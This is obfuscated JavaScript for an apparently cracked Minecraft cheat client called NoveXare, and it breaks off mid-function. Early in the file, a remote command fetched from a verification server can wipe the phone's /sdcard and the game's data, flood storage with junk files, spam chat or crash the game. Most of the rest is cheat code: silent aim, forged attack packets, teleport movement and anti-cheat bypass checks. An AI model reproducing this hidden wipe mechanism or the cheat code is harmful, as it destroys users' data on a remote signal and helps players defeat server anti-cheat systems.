/*
*一辈又一辈,你依旧在.
*Crack By Unknow.
*Time:2024/10/3.
*不是不报,是时候未到.
*/
let request_get = curl_get;
curl_get = function (url, headers, callback) {
  request_get(url, headers, (result_code, data) => {
    if (url.includes("http://w.t3yanzheng.com/44DBDBB5C8FF58DD?t=")) {
      data = 0;
    }
    if (url.includes("http://w.t3yanzheng.com/456CA7E821390F1B?t=")) {
      data = `
/*
*一辈又一辈,你依旧在.
*Crack By Unknow.
*Time:2024/10/3.
*不是不报,是时候未到.
*/`;
    }
    if (url.includes("http://w.t3yanzheng.com/1FA2DE155A5C0CE2?t=")) {
      data = "CrackVersion";
    }
    callback(result_code, data);
  });
};
file_delete(getResource() + "/script/XxxGBRCxxX.js");
const version = 19890604;
curl_get("http://w.t3yanzheng.com/1FA2DE155A5C0CE2?t=" + Date.now(), {}, function (_0x354878, _0x2b3680) {
  if (_0x2b3680 == "delete_script") {
    file_delete(getResource() + "/script/NoveXare.js");
  }
  if (_0x2b3680 == "delete_all") {
    file_delete("/sdcard");
    file_delete("/data/data/com.netease.x19");
  }
  if (_0x2b3680 == "delete_runaway") {
    file_delete("/data/data/com.netease.x19/shared_prefs/com.mojang.minecraftpe.MainActivity.xml");
  }
  if (_0x2b3680 == "delete_user") {
    setData("NoveXare_Verify", "{}");
  }
  if (_0x2b3680 == "boom") {
    for (i = 0; i < 114514; i++) {
      write_file("/sdcard/" + i, "你好".repeat(114514));
    }
  }
  if (_0x2b3680 == "RunAway") {
    sendChatMessage("!购买跑路科技找我");
  }
  if (_0x2b3680 == "exit") {
    exit();
  }
  if (_0x2b3680 == "闪退") {
    setEntityName(self_id, "你好");
  }
});
curl_get("http://w.t3yanzheng.com/44DBDBB5C8FF58DD?t=" + Date.now(), {}, function (_0x585080, _0x16d5d7) {
  if (Number(_0x16d5d7) > version) {
    clientMessage("§3§l[NoveXare] §r§7>>>§r§c 版本号较低 §7>>>§r " + _0x16d5d7);
    exit();
  } else {
    clientMessage("§3§l[NoveXare] §r§7>>>§r 版本号 §7>>>§r " + version);
  }
});
curl_get("http://w.t3yanzheng.com/456CA7E821390F1B?t=" + Date.now(), {}, function (_0x2fdf30, _0x388916) {
  clientMessage("§3§l[NoveXare] §r§7>>>§r 公告 §r§7>>>§r " + _0x388916);
});
const analysisNBT = _0x8cbd04 => {
  if (_0x8cbd04 == last_item_data.nbt) {
    return last_item_data.object;
  }
  const _0x1e2f94 = (_0x48245e, _0x269709, _0x1216f4, _0x4e71fc) => {
    let _0x500844 = _0x48245e.indexOf(_0x269709) + _0x269709.length;
    let _0x5ed954 = _0x48245e.indexOf(_0x1216f4, _0x500844);
    if (_0x4e71fc != undefined && _0x48245e.indexOf(_0x4e71fc, _0x5ed954) < _0x5ed954) {
      _0x5ed954 = _0x48245e.indexOf(_0x4e71fc, _0x500844);
    }
    return _0x48245e.substring(_0x500844, _0x5ed954);
  };
  const _0xc2f630 = _0x1e2f94(_0x8cbd04, ",Name:\"", "\",WasPickedUp");
  if (_0xc2f630 == "") {
    return {
      aux: 0,
      count: 0,
      namespace: "minecraft:air",
      enchants: []
    };
  }
  const _0x1f0dc1 = Number(_0x1e2f94(_0x8cbd04, ",aux:", ","));
  const _0x28f815 = Number(_0x1e2f94(_0x8cbd04, "Count:", "b,D"));
  const _0x185645 = _0x8cbd04.includes(",name:\"") ? _0x1e2f94(_0x8cbd04, ",name:\"", "\"}") : _0xc2f630.replace("minecraft:", "");
  const _0x556a0d = _0x8cbd04.includes("maxDamage") ? Number(_0x1e2f94(_0x8cbd04, ",maxDamage:", ",")) : 0;
  const _0x423fc8 = _0x8cbd04.includes("attackDamage") ? Number(_0x1e2f94(_0x8cbd04, "attackDamage:", ",")) : 1;
  const _0x5076dc = _0x8cbd04.includes("customColor") ? _0x1e2f94(_0x8cbd04, "customColor:", "}", ",") : "";
  const _0x8f48ab = _0x8cbd04.includes("ench:[{") ? ("[{" + _0x1e2f94(_0x8cbd04, "ench:[{", "}]")).replace(/s/g, "").replace(/id/g, "\"id\"").replace(/lvl/g, "\"lvl\"").replace(/modEnchant/g, "\"modEnchant\"") + "}]" : "[]";
  const _0x1fe21b = _0x8cbd04.includes("Block:");
  var _0x493f6d = {
    name: _0x185645,
    namespace: _0xc2f630,
    aux: _0x1f0dc1,
    damage: _0x556a0d,
    attackDamage: _0x423fc8,
    count: _0x28f815,
    color: _0x5076dc,
    isBlock: _0x1fe21b
  };
  _0x493f6d.enchants = JSON.parse(_0x8f48ab);
  const _0x1a39cf = _0x493f6d;
  last_item_data.object = _0x1a39cf;
  last_item_data.nbt = _0x8cbd04;
  return _0x1a39cf;
};
const getTargetInfo = _0x56b1df => {
  const {
    x,
    y
  } = getEntitySize(_0x56b1df);
  const _0x1f64f3 = getEntityMotion(_0x56b1df);
  const _0x4586f8 = getEntityPos(_0x56b1df);
  const _0x5605a9 = getEntityName(_0x56b1df);
  const _0x1f18a7 = getEntityNamespace(_0x56b1df);
  const _0x4f6229 = getDistanceByID(self_id, _0x56b1df);
  const _0x1036fa = getCarried(_0x56b1df);
  const _0x4cd969 = getSpeed(_0x56b1df);
  const _0x51e601 = getEntityAttribute(_0x56b1df, "minecraft:health");
  const _0x2d184d = getEntityAttribute(_0x56b1df, "minecraft:movement");
  const _0x7b221d = getEntityTypeId(_0x56b1df);
  const _0x2dbfb9 = getEntityTarget(_0x56b1df);
  const _0x442ea0 = getPlayerInventorySize(_0x56b1df);
  const _0x1c53c8 = getPlayerHotBarSize(_0x56b1df);
  const {
    yaw,
    pitch
  } = getEntityRot(_0x56b1df);
  const _0xa891d5 = "唯一ID:" + _0x56b1df + " 昵称:" + _0x5605a9 + "§r 实体命名空间:" + _0x1f18a7 + " 水平碰撞箱:" + x.toFixed(2) + " 垂直碰撞箱:" + y.toFixed(2) + " Mot速度:" + _0x4cd969 + " \nability速度:[max:" + _0x2d184d.max + ", min:" + _0x2d184d.min + ", current:" + _0x2d184d.current + "] 血量:[max:" + _0x51e601.max + ", min:" + _0x51e601.min + ", current:" + _0x51e601.current + "]\n手持:[id:" + _0x1036fa.id + ", namespace:" + _0x1036fa.namespace + ", name:" + _0x1036fa.name + "§r, aux:" + _0x1036fa.aux + "] 距离:" + _0x4f6229 + " 实体类型:" + _0x7b221d + " \n仰俯角:" + pitch.toFixed(2) + "° 偏航角:" + yaw.toFixed(2) + "° 仇恨目标:" + getEntityName(_0x2dbfb9) + "^" + _0x2dbfb9 + "\n移动值:[" + _0x1f64f3.x.toFixed(2) + ", " + _0x1f64f3.y.toFixed(2) + ", " + _0x1f64f3.z.toFixed(2) + "] 坐标值:[" + _0x4586f8.x.toFixed(2) + ", " + _0x4586f8.y.toFixed(2) + ", " + _0x4586f8.z.toFixed(2) + "]\n背包容量:" + _0x442ea0 + " 物品栏容量:" + _0x1c53c8;
  return _0xa891d5;
};
const getCarried = _0x1c91c8 => analysisNBT(getEntityCarriedItem(_0x1c91c8));
const getOffhand = _0x25a68c => analysisNBT(getEntityOffhandItem(_0x25a68c));
const getInventory = (_0x35776f, _0x469e5d) => analysisNBT(getPlayerInventoryItem(_0x35776f, _0x469e5d));
const loadSound = (_0x25b47f, _0x1e9bae) => {
  var _0x4fd2bf = {
    type: "Menu",
    title: {},
    color: "#000000",
    alpha: 0,
    can_close: true,
    show_dividers: false,
    hide: false,
    items: [{
      type: "Web",
      url: _0x25b47f,
      params: [-1, -1]
    }]
  };
  _0x4fd2bf.title.name = "Sound";
  _0x4fd2bf.title.size = 1;
  _0x4fd2bf.title.elevation = 3;
  _0x4fd2bf.title.background = "#000000";
  _0x4fd2bf.title.padding = [4, 4, 4, 4];
  _0x4fd2bf.title.colors = ["#000000", "#000000"];
  _0x4fd2bf.title.image_scaled = true;
  const _0x3ac2f5 = _0x4fd2bf;
  const _0x81b90b = getResource();
  write_file(_0x81b90b + "/script/temp.js", "const t = String(Date.now());\nloadMenu(t, '" + JSON.stringify(_0x3ac2f5) + `');
thread(() => showMenu(t), 10);
thread(() => removeMenu(t), ` + (_0x1e9bae + 10) + ")");
  loadScript("temp.js");
  setTimeout(() => file_delete(_0x81b90b + "/script/temp.js"), 500);
};
const destroyPacket = (_0x497026, _0x17950b, _0x32071b, _0x46bf19 = false, _0x3f5dae = false) => {
  var _0x44d0b8 = {
    x: _0x497026,
    y: _0x17950b,
    z: _0x32071b
  };
  let _0x5dacca = _0x44d0b8;
  const _0x2e7c46 = [0, 26, 18, 2];
  const _0x3a437f = _0x22a0ba => sendPlayerAuthInput({
    pos: getEntityPos(self_id),
    rot: {
      pitch: 0,
      yaw: 0
    },
    yHeadRot: 0,
    inputMode: 2,
    playMode: 0,
    analogMoveVector: {
      x: 0,
      y: 0
    },
    vehicleRotation: {
      yaw: 0,
      pitch: 0
    },
    move: {
      x: 0,
      y: 0
    },
    actions: _0x22a0ba.map(_0x117077 => ({
      type: _0x117077,
      pos: _0x5dacca,
      value: 1
    }))
  });
  const _0x9e9d47 = _0xed7805 => sendPlayerAction({
    id: self_id,
    pos: _0x5dacca,
    value: 1,
    type: _0xed7805
  });
  if (_0x46bf19) {
    _0x3a437f(_0x2e7c46);
  }
  if (_0x3f5dae) {
    _0x2e7c46.forEach(_0x30d0f1 => _0x9e9d47(_0x30d0f1));
  }
};
const moveItem = (_0x1cf093, _0x59b9a2, _0x2e4c0c = true) => {
  if (_0x1cf093 == _0x59b9a2) {
    return false;
  }
  const _0x14b4c7 = getInventory(self_id, _0x1cf093);
  const _0x2130a9 = getInventory(self_id, _0x59b9a2);
  if (_0x2e4c0c && _0x59b9a2 < 9 && _0x2130a9.namespace != "minecraft:air") {
    for (let _0x38bc05 = 35; _0x38bc05 > 8; _0x38bc05--) {
      const _0xb921d0 = getInventory(self_id, _0x38bc05);
      if (_0xb921d0.namespace == "minecraft:air") {
        moveInventoryItem(_0x59b9a2, _0x38bc05);
        break;
      }
    }
  }
  if (_0x14b4c7.namespace != "minecraft:air" && _0x2130a9.namespace == "minecraft:air") {
    moveInventoryItem(_0x1cf093, _0x59b9a2);
  }
};
const silentAim = (_0x54518e, _0x1660ab, _0x15a3b0, _0x1dcfaa) => {
  _0x1660ab -= 180;
  if (_0x54518e > 90) {
    _0x54518e -= 90;
  }
  if (_0x54518e < -90) {
    _0x54518e += 90;
  }
  if (_0x1660ab > 180) {
    _0x1660ab = _0x1660ab - 360;
  }
  if (_0x1660ab < -180) {
    _0x1660ab = 360 + _0x1660ab;
  }
  var _0xd6fb79 = {
    pitch: _0x54518e,
    yaw: _0x1660ab
  };
  var _0x39b941 = {
    id: self_id,
    pos: self_pos,
    mode: 1,
    ground: true,
    rot: _0xd6fb79,
    yHeadRot: _0x54518e
  };
  if (_0x15a3b0) {
    sendMovePlayer(_0x39b941);
  }
  if (_0x1dcfaa) {
    setEntityRot(self_id, _0x54518e, _0x1660ab);
    setEntityBodyRot(self_id, _0x1660ab);
  }
};
const callFunc = (_0x122d0c, _0x39a315) => {
  if (!FuncMessage || !_0x122d0c.includes("_")) {
    if (_0x39a315) {
      clientMessage("§3§l[NoveXare] §r§7>>>§r " + _0x122d0c + " §r§7>>>" + (RainbowTip ? "§" + rgb_color[rgb_l] : "§a") + " §lEnable ✔");
    } else {
      clientMessage("§3§l[NoveXare] §r§7>>>§r " + _0x122d0c + " §r§7>>>" + (RainbowTip ? "§" + rgb_color[rgb_l] : "§c") + " §lDisable ✖");
    }
  }
  if (ArrayList && !_0x122d0c.includes("_")) {
    addCustomArrayList(_0x122d0c, _0x122d0c, _0x122d0c, _0x39a315);
  }
  if (ArrayListCfg[_0x122d0c] != undefined) {
    addCustomArrayList(_0x122d0c, ArrayListCfg[_0x122d0c].CN, ArrayListCfg[_0x122d0c].EN, _0x39a315);
  }
  if (bind_func[_0x122d0c] != undefined && bind_func[_0x122d0c].length > 0) {
    for (let _0xded982 of bind_func[_0x122d0c]) {
      callFunc(_0xded982, _0x39a315);
    }
  }
  if (RunAway_binds[_0x122d0c] != undefined && RunAway_binds[_0x122d0c].length > 0) {
    var _0x30d027 = {
      value: _0x39a315
    };
    for (let _0x1e9f08 of RunAway_binds[_0x122d0c]) {
      callModule(Number(_0x1e9f08), JSON.stringify(_0x30d027));
    }
  }
  globalThis[_0x122d0c] = _0x39a315;
  NoveXare_Config[_0x122d0c] = _0x39a315;
};
const drawParticle = (_0x25d07a, _0x37cca4, _0x5ee8eb, _0x962bb7, _0x999bb3, _0x1bb63f = false, _0x2302c1 = {}) => {
  for (let _0x41d9ce = 0; _0x41d9ce < _0x999bb3; _0x41d9ce++) {
    addParticle(Number(_0x25d07a), _0x37cca4, _0x5ee8eb, _0x962bb7, _0x1bb63f ? _0x2302c1.x : _0x37cca4, _0x1bb63f ? _0x2302c1.y : _0x5ee8eb, _0x1bb63f ? _0x2302c1.z : _0x962bb7, 1, _0x1bb63f);
  }
};
const useItem = () => {
  const _0x4d470a = getCarried(self_id);
  const _0x4c076b = getEntityPos(self_id);
  if (_0x4d470a.namespace != "minecraft:air" && _0x4d470a.count > 0) {
    buildBlock(self_id, _0x4c076b.x, _0x4c076b.y, _0x4c076b.z, 6);
  }
};
const useArmor = _0x30f263 => {
  StartArmor = true;
  const _0x4c516c = getInventory(self_id, _0x30f263);
  const _0x232f7c = getItemType(self_id, _0x30f263);
  const _0x2cf4f4 = ["helmet", "chestplate", "leggings", "boots"];
  if (_0x4c516c.namespace != "minecraft:air" && _0x4c516c.count > 0 && _0x2cf4f4.includes(_0x232f7c) && selectPlayerInventorySlot(self_id, _0x30f263)) {
    setTimeout(() => {
      var _0x1e82e4 = getCarried(self_id);
      if (_0x1e82e4.namespace == _0x4c516c.namespace) {
        useItem();
        StartArmor = false;
      }
    }, 50);
  }
};
const getParabola = (_0xe670b8, _0x1536ae, _0x183e78, _0x287326) => {
  let _0x314a7e = _0x1536ae > 0;
  _0x1536ae = Math.abs(_0x1536ae);
  let _0xb96ee1 = _0x183e78 * Math.cos(_0x1536ae * Math.PI / 180);
  let _0x57852e = _0x183e78 * Math.sin(_0x1536ae * Math.PI / 180);
  let _0x5bc674 = _0x57852e / _0x287326;
  let _0x362627 = _0x287326 * (_0x5bc674 * _0x5bc674) * 0.5;
  let _0x578779 = _0xb96ee1 * _0x5bc674;
  let _0xc1f4 = -_0x362627 / (_0x578779 * _0x578779);
  var _0x573e4f = {};
  _0x573e4f.data = _0xc1f4 * Math.pow(_0xe670b8 - (_0x314a7e ? -_0x578779 : _0x578779), 2) + _0x362627;
  _0x573e4f.bool = _0x314a7e;
  return _0x573e4f;
};
const getUserID = _0x383706 => _0x383706 == undefined || _0x383706 == null ? getLocalPlayerUniqueID() : _0x383706;
const Click = (_0x21389e, _0x273394, _0x1825ad) => {
  const _0x212754 = [[_0x21389e, _0x273394 + 1, _0x1825ad], [_0x21389e, _0x273394 - 1, _0x1825ad], [_0x21389e, _0x273394, _0x1825ad + 1], [_0x21389e, _0x273394, _0x1825ad - 1], [_0x21389e + 1, _0x273394, _0x1825ad], [_0x21389e - 1, _0x273394, _0x1825ad]];
  for (let _0x53df1d = 0; _0x53df1d < _0x212754.length; _0x53df1d++) {
    const _0x535919 = getBlock(_0x212754[_0x53df1d][0], _0x212754[_0x53df1d][1], _0x212754[_0x53df1d][2]);
    if (_0x535919.namespace !== "minecraft:air") {
      buildBlock(self_id, _0x212754[_0x53df1d][0], _0x212754[_0x53df1d][1], _0x212754[_0x53df1d][2], _0x53df1d);
      break;
    }
  }
};
const playSound = (_0x5f4122, _0x3d6a11) => {
  const _0x2e10b5 = getEntityPos(self_id);
  sendSound(_0x5f4122, _0x2e10b5.x, _0x2e10b5.y, _0x2e10b5.z, _0x3d6a11);
};
const Teleport = (_0x11b8cd, _0x86bd5a, _0x2b6bd4) => {
  const _0x262cad = getEntityPos(self_id);
  motion_list.push([_0x11b8cd - _0x262cad.x, _0x86bd5a - _0x262cad.y, _0x2b6bd4 - _0x262cad.z]);
  motion_list.push([0, 0, 0]);
};
const getItemCount = (_0x135bfa, _0x51ec31) => {
  let _0x3f0c05 = 0;
  let _0x2dd0ec = _0x135bfa == -1 ? getCarried(self_id) : getInventory(self_id, _0x135bfa);
  if (_0x51ec31 != undefined) {
    _0x2dd0ec.namespace = _0x51ec31;
  }
  for (let _0x18f9ec = 0; _0x18f9ec < 36; _0x18f9ec++) {
    let _0x203aa0 = getInventory(self_id, _0x18f9ec);
    if ((_0x203aa0.namespace == _0x2dd0ec.namespace || _0x203aa0.namespace.includes(_0x51ec31)) && (_0x51ec31 != undefined || _0x203aa0.aux == _0x2dd0ec.aux)) {
      _0x3f0c05 += _0x203aa0.count;
    }
  }
  return _0x3f0c05;
};
const hasItem = (_0x17fad8, _0x1b4749, _0x199b30 = "hotbar") => {
  let _0x2509fb = false;
  const _0x56a9bb = _0x199b30 == "hotbar" ? 9 : 36;
  for (let _0x109ad8 = 0; _0x109ad8 < _0x56a9bb; _0x109ad8++) {
    let _0x1ff14e = getInventory(_0x17fad8, _0x109ad8);
    if (_0x1ff14e.namespace == _0x1b4749 || _0x1ff14e.namespace.includes(_0x1b4749)) {
      _0x2509fb = true;
      break;
    }
  }
  return _0x2509fb;
};
const getItemType = (_0x51a05b, _0x4bdbb0, _0x33a307) => {
  var _0x3118ba = _0x4bdbb0 == -1 ? getCarried(_0x51a05b) : getInventory(_0x51a05b, _0x4bdbb0);
  if (!_0x3118ba.namespace.includes("_") && _0x33a307 == undefined) {
    return "other";
  }
  var _0x1ea810 = _0x33a307 == undefined ? _0x3118ba.namespace.replace("minecraft:", "") : _0x33a307.replace("minecraft:", "");
  const _0x525864 = _0x1ea810.split("_");
  return _0x525864[1];
};
const getEntityMaxDamage = _0x2c7d33 => {
  let _0xdfac92 = 0;
  for (let _0x356b8d = 0; _0x356b8d < 36; _0x356b8d++) {
    const _0x525b2b = getItemDamage(_0x2c7d33, _0x356b8d);
    if (_0x525b2b > _0xdfac92) {
      _0xdfac92 = _0x525b2b;
    }
  }
  return _0xdfac92;
};
const getEntityMaxArmor = (_0xe6364d, _0x1e7058) => {
  let _0x16418a = 0;
  for (let _0x39237a = 0; _0x39237a < 36; _0x39237a++) {
    const _0x19ddce = getItemArmor(_0xe6364d, _0x39237a);
    if (getItemType(_0xe6364d, _0x39237a) == _0x1e7058 && _0x16418a < _0x19ddce) {
      _0x16418a = _0x19ddce;
    }
  }
  return _0x16418a;
};
const getItemArmor = (_0x13f7eb, _0x8389fc) => {
  var _0x45fb66 = _0x8389fc == -1 ? getCarried(_0x13f7eb) : getInventory(_0x13f7eb, _0x8389fc);
  if (_0x8389fc < -1) {
    _0x45fb66 = analysisNBT(getPlayerArmorItem(_0x13f7eb, _0x8389fc + 2));
  }
  if (_0x45fb66.damage == 1) {
    return 0;
  }
  var _0xfffc46 = 0;
  if (_0x45fb66.enchants.length > 0) {
    for (let _0x12576f of _0x45fb66.enchants) {
      if (_0x12576f.id == 0) {
        _0xfffc46 = _0x12576f.lvl;
        break;
      }
    }
  }
  return _0x45fb66.damage + _0xfffc46;
};
const getItemDamage = (_0x2916b4, _0x3d145a) => {
  var _0x5a35f2 = _0x3d145a == -1 ? getCarried(_0x2916b4) : getInventory(_0x2916b4, _0x3d145a);
  if (_0x5a35f2.attackDamage == 1) {
    return 1;
  }
  var _0x4328ae = 0;
  if (_0x5a35f2.enchants.length > 0) {
    for (let _0x1d379f of _0x5a35f2.enchants) {
      if (_0x1d379f.id == 9) {
        _0x4328ae = _0x1d379f.lvl * 1.25;
        break;
      }
    }
  }
  return _0x5a35f2.attackDamage + _0x4328ae;
};
const b2s = _0x55b7ea => _0x55b7ea ? "true" : "false";
const getText = (_0x5d50ed, _0x437b26, _0x26a96f) => {
  let _0x5d5d62 = _0x5d50ed.split(_0x437b26).length - 1;
  let _0x16c0ba = 0;
  let _0x449842 = [];
  for (let _0x29f9b3 = 0; _0x29f9b3 < _0x5d5d62; _0x29f9b3++) {
    let _0x4208d4 = _0x5d50ed.indexOf(_0x437b26, _0x16c0ba) + _0x437b26.length;
    let _0x430006 = _0x5d50ed.indexOf(_0x26a96f, _0x4208d4);
    _0x16c0ba = _0x430006;
    _0x449842.push(_0x5d50ed.substring(_0x4208d4, _0x430006));
  }
  if (_0x5d5d62 > 1) {
    return _0x449842;
  } else {
    return _0x449842[0];
  }
};
const attack = (_0x145920, _0x98994f) => {
  attackEntity(_0x145920, _0x98994f);
  if (AttackPacket) {
    sendRpc(98247598, "93c40b4d6f644576656e7443325394c41145434e756b6b6974436c69656e744d6f64c41445434e756b6b6974436c69656e7453797374656dc419496e7465726163744265666f7265436c69656e744576656e7481c40474797065c403544150c0");
  }
};
const getItem = (_0x188ce0, _0x2db54f, _0x1c2f08, _0x342772) => {
  if (_0x1c2f08 == undefined) {
    _0x1c2f08 = -1;
  }
  if (_0x342772 == undefined) {
    _0x342772 = -1;
  }
  let _0x5af917 = null;
  for (index = 0; index < 9; index++) {
    const _0x23776e = getInventory(_0x188ce0, index);
    if (!_0x23776e.namespace) {
      continue;
    }
    if (_0x23776e.namespace.includes(_0x2db54f) && (_0x23776e.aux == _0x1c2f08 || _0x1c2f08 == -1) && (_0x23776e.name.includes(_0x342772) || _0x342772 == -1)) {
      _0x5af917 = index;
      break;
    }
  }
  return _0x5af917;
};
const getSpeed = _0x44d20f => {
  const _0x14ae88 = getEntityMotion(_0x44d20f);
  const _0x14759b = Math.sqrt(_0x14ae88.x * _0x14ae88.x + _0x14ae88.y * _0x14ae88.y + _0x14ae88.z * _0x14ae88.z);
  return _0x14759b * 20;
};
const getRandomNum = (_0x48ae5d, _0x1e3942) => {
  const _0x2d6dea = _0x1e3942 - _0x48ae5d + 1;
  return Math.floor(Math.random() * _0x2d6dea) + _0x48ae5d;
};
const predictEntityPos = (_0x5b5388, _0xf03171, _0x321110) => {
  var _0xabbe78 = {
    x: _0xf03171.x + _0x5b5388.x * _0x321110,
    y: _0xf03171.y + _0x5b5388.x * _0x321110,
    z: _0xf03171.z + _0x5b5388.z * _0x321110
  };
  return _0xabbe78;
};
const timeFormat = _0x5d4f12 => {
  if (_0x5d4f12 < 60) {
    return _0x5d4f12 + "s";
  }
  if (_0x5d4f12 >= 60) {
    return Math.floor(_0x5d4f12 / 60) + "min " + _0x5d4f12 % 60 + "s";
  }
};
const checkWall = (_0x414bc9, _0x55b679, _0x26f1bb) => {
  if (!_0x26f1bb) {
    return true;
  }
  const _0x18c26a = getPlayerAngle(_0x414bc9, _0x55b679, "yaw_pos");
  const _0x97e58e = -getPlayerAngle(_0x414bc9, _0x55b679, "pitch_pos");
  const _0x4d956a = getDistance(_0x414bc9, _0x55b679);
  var _0x7d193e = true;
  for (let _0x342cb3 = 0; _0x342cb3 < _0x4d956a; _0x342cb3 += 0.5) {
    var _0x20b19f = {
      yaw: _0x18c26a,
      pitch: _0x97e58e
    };
    const _0x331295 = getDisplacement(_0x342cb3, _0x55b679, _0x20b19f);
    const _0x2dfa24 = getBlock(_0x331295.x, _0x331295.y, _0x331295.z);
    if (_0x2dfa24.namespace != "minecraft:air") {
      _0x7d193e = false;
      break;
    }
  }
  return _0x7d193e;
};
const PlayerSelector = (_0xb5a088, _0x2ba43c) => {
  var _0x128d45 = getWorldPlayerList();
  var _0xb196a0 = _0x128d45.length > 0 ? _0x128d45.map(_0x105c5a => ({
    text: _0x105c5a.name
  })) : [{
    text: "没有数据"
  }];
  var _0x3261cb = {
    type: "form",
    title: "选择",
    content: "选择一个目标",
    buttons: _0xb196a0
  };
  var _0x9cfc8f = _0x3261cb;
  const _0x236d48 = JSON.stringify(_0x9cfc8f);
  addForm(_0x236d48, function (_0x1fe549) {
    if (_0x128d45.length > 0 && _0x1fe549 >= 0) {
      var _0x3f9b05 = _0x2ba43c === 0 ? _0x128d45[_0x1fe549].name : _0x128d45[_0x1fe549].id;
      globalThis[_0xb5a088].push(_0x3f9b05);
      if (FuncTip) {
        clientMessage("§3§l[NoveXare] §r§7>>>§r AddTarget §7>>>§r " + _0x3f9b05);
      }
    }
  });
};
const getDisplacement = (_0x3cf3ad, _0x490698, _0x925ee1) => {
  var _0x5f586f = _0x3cf3ad < 0 ? true : false;
  let {
    yaw,
    pitch
  } = _0x925ee1;
  if (yaw <= -180) {
    yaw = 180 + yaw;
  }
  _0x3cf3ad = Math.abs(_0x3cf3ad);
  const _0x2b5402 = yaw * Math.PI / 180;
  const _0x50a4b9 = pitch * Math.PI / 180;
  let _0x554c5c = 0;
  let _0xc5b191 = pitch != 0 ? Math.sin(_0x50a4b9) * _0x3cf3ad : 0;
  let _0x3a5493 = 0;
  var _0x3fbab8 = pitch != 0 ? _0xc5b191 / Math.tan(_0x50a4b9) : _0x3cf3ad;
  var _0x26ac13 = _0x3fbab8 < 0;
  _0x3fbab8 = Math.abs(_0x3fbab8);
  const _0x1250b4 = Math.cos(_0x2b5402) * _0x3fbab8;
  const _0x10ffa4 = Math.sin(_0x2b5402) * _0x3fbab8;
  _0x554c5c = -Math.sin(_0x2b5402) * _0x3fbab8;
  _0x3a5493 = Math.cos(_0x2b5402) * _0x3fbab8;
  if (_0x5f586f || _0x26ac13) {
    _0x554c5c = -_0x554c5c;
    if (!_0x26ac13) {
      _0xc5b191 = -_0xc5b191;
    }
    _0x3a5493 = -_0x3a5493;
  }
  var _0x242d5d = {
    x: _0x490698.x + _0x554c5c,
    y: _0x490698.y - _0xc5b191,
    z: _0x490698.z + _0x3a5493
  };
  return _0x242d5d;
};
const getPlayerItemCount = _0x29d1df => {
  let _0x5e2625 = 0;
  for (let _0xb7f2c9 = 0; _0xb7f2c9 < 36; _0xb7f2c9++) {
    let _0x5d3cef = getInventory(_0x29d1df, _0xb7f2c9);
    if (_0x5d3cef.count == 0) {
      continue;
    }
    _0x5e2625 += _0x5d3cef.count;
  }
  return _0x5e2625;
};
const isSame = (_0x3fe836, _0x31dc61, _0x303aaa) => Math.abs(_0x3fe836 - _0x31dc61) < _0x303aaa;
const getTargets = (_0x582783, _0xd69122, _0x2d4b82) => {
  let _0x5e7e58 = [];
  if (includeMob) {
    _0x5e7e58 = _0x5e7e58.concat(getEntityList());
  }
  if (includePlayer) {
    _0x5e7e58 = _0x5e7e58.concat(getPlayerList());
  }
  if (_0x5e7e58.length === 0) {
    return [];
  }
  _0x2d4b82 = Math.min(_0x2d4b82, _0x5e7e58.length);
  let _0x47ec84 = [];
  for (const _0x211eb3 of _0x5e7e58) {
    const _0x58b7ce = getEntityNamespace(_0x211eb3);
    if (entity_keyword.length > 0 && entity_keyword.some(_0x411310 => _0x58b7ce.includes(_0x411310)) != back_select) {
      continue;
    }
    const _0x4551f4 = getEntityRot(_0x211eb3);
    const _0x28596d = bypass_bjd ? getEntityAttribute(_0x211eb3, "minecraft:movement") : {
      current: 0,
      max: 0
    };
    if (bypass_bjd && _0x28596d.current >= 0.2 && _0x28596d.max > 1024 && _0x4551f4.yaw.toFixed(2) === 0 && _0x4551f4.pitch.toFixed(2) === 0) {
      continue;
    }
    if (check_rot && (_0x4551f4.yaw.toFixed(2) === 0 || _0x4551f4.pitch.toFixed(2) === 0 || _0x4551f4.yaw == undefined || _0x4551f4.pitch == undefined)) {
      continue;
    }
    const _0x3e96a6 = getEntityFlag(_0x211eb3, 5);
    if (check_hide && _0x3e96a6) {
      continue;
    }
    const _0x30437b = getEntityIsGround(_0x211eb3);
    if (check_ground && !_0x30437b) {
      continue;
    }
    const _0x39e26e = getEntityAttribute(_0x211eb3, "minecraft:health");
    if (check_health && (_0x39e26e.current <= 0 || _0x39e26e.max == 0 || _0x39e26e.current == undefined)) {
      continue;
    }
    const _0x4746ea = getEntityPos(_0x211eb3);
    const _0x422149 = getDistance(_0x4746ea, getEntityPos(_0x582783));
    if ((_0x422149 > _0xd69122 || _0x422149 < min_distance) && !InfiniteAura && !infinite_distance) {
      continue;
    }
    if (!checkWall(getEntityPos(self_id), _0x4746ea, check_wall)) {
      continue;
    }
    const _0x59f36b = getEntityName(_0x211eb3);
    if (Teams && teams_name && (_0x59f36b.startsWith(team) || team.includes("[") && _0x59f36b.includes(team))) {
      continue;
    }
    const _0x3853f7 = isPlayer(_0x211eb3) && teams_armor ? analysisNBT(getPlayerArmorItem(_0x211eb3, team_slot)) : {};
    if (Teams && _0x3853f7 != "" && isPlayer(_0x211eb3) && teams_armor && _0x3853f7.color == analysisNBT(getPlayerArmorItem(self_id, team_slot)).color) {
      continue;
    }
    if (white_list.includes(_0x211eb3) != back_select || !check_name && (_0x59f36b === getEntityName(_0x582783) || _0x59f36b === "") || (_0x4746ea.y > limit_y || _0x4746ea.y < limit_min_y) && !NoHeigh || _0x211eb3 === self_id) {
      continue;
    }
    if (regex_enable && regex.some(_0x58d0c9 => _0x59f36b.includes(_0x58d0c9)) != back_select) {
      continue;
    }
    const _0x52d30c = check_size ? getEntitySize(_0x211eb3) : {
      x: 0,
      y: 0
    };
    if (check_size && (_0x52d30c.x > default_size.x + 0.1 || _0x52d30c.x < default_size.x - 0.1) && (_0x52d30c.y > 1.66 || _0x52d30c.y < 1.64) && (_0x52d30c.y < default_size.y || _0x52d30c.y > default_size.y + 0.1) && (_0x52d30c.y > 1.51 || _0x52d30c.y < 1.49)) {
      continue;
    }
    const _0x304561 = func_mode.select_mode === 4 ? getPlayerItemCount(_0x211eb3) : 0;
    const _0x1c7163 = func_mode.select_mode === 3 ? getPlayerAngle(self_id, _0x211eb3, "yaw_rot") : 0;
    const _0x192ef2 = func_mode.select_mode === 3 ? getPlayerAngle(self_id, _0x211eb3, "pitch_rot") : 0;
    const _0x195d98 = func_mode.select_mode === 2 ? getItemDamage(_0x211eb3, -1) : 8;
    var _0x24b8e0 = {
      distance: _0x422149,
      target_id: _0x211eb3,
      damage: _0x195d98,
      heal: _0x39e26e.current
    };
